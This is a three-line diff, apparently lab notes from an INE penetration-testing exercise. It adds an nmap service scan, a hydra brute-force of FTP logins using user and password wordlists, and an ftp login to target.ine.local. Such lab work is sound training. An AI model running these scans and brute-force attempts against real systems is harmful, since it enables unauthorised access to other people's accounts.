@@ -1,0 +1,3 @@
+nmap -sC -sV target.ine.local
+hydra -L users.txt -P passwords.txt ftp://target.ine.local
+ftp target.ine.local
